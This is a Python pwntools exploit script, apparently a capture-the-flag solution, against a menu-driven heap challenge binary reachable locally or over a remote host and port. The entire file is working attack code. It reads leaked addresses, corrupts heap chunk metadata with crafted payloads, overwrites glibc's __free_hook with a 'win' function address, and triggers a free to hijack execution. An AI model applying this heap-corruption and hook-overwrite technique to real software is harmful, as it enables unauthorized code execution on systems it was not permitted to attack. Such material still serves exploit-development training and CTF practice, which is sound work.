import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###main###
def main():
    _ = target.readuntil("<__free_hook>: ")
    free_hook_addr = int(target.readline()[2:-1], 16)
    _ = target.readuntil("<win>: ")
    win_addr = int(target.readline()[2:-1], 16)
    logging.info("[*] free_hook addr = 0x{:x}".format(free_hook_addr))
    logging.info("[*] win addr = 0x{:x}".format(win_addr))

    _ = target.readuntil("> ")
    _ = target.readuntil("> ")
    target.sendline("1")
    target.sendline(b"AAAAAAAA")

    _ = target.readuntil("> ")
    target.sendline("2")
    target.sendline(b"BBBBBBBB")
    
    _ = target.readuntil("> ")
    target.sendline("4")
    logging.info(target.readuntil("> "))
    target.sendline("5")
    logging.info(target.readuntil("> "))
    
    target.sendline("3")

    payload1 = b"A" * 8
    payload1 += p64(0x0a)
    payload1 += p64(0x00)
    payload1 += p64(0x20cc1)
    payload1 += p64(free_hook_addr)
    
    _ = target.readuntil("> ")
    target.sendline("1")
    target.sendline(payload1)

    _ = target.readuntil("> ")

    target.sendline("4")
    logging.info(target.readuntil("> "))
    target.sendline("5")
    logging.info(target.readuntil("> "))
    
    target.sendline("2")
    target.sendline(b"BBBBBBBB")

    payload2 = b"A" * 8
    payload2 += p64(0x0a)
    payload2 += p64(0x00)
    payload2 += p64(0x401)
    
    _ = target.readuntil("> ")
    target.sendline("1")
    target.sendline(payload2)

    _ = target.readuntil("> ")
    target.sendline("3")
    _ = target.readuntil("> ")


    target.sendline("4")
    logging.info(target.readuntil("> "))
    target.sendline("5")
    logging.info(target.readuntil("> "))
    
    target.sendline("2")
    target.sendline(p64(win_addr))
    
    _ = target.readuntil("> ")
    target.sendline("3")
    
    print(target.readline())
    print(target.readline())

    
if __name__ == "__main__":
    main()
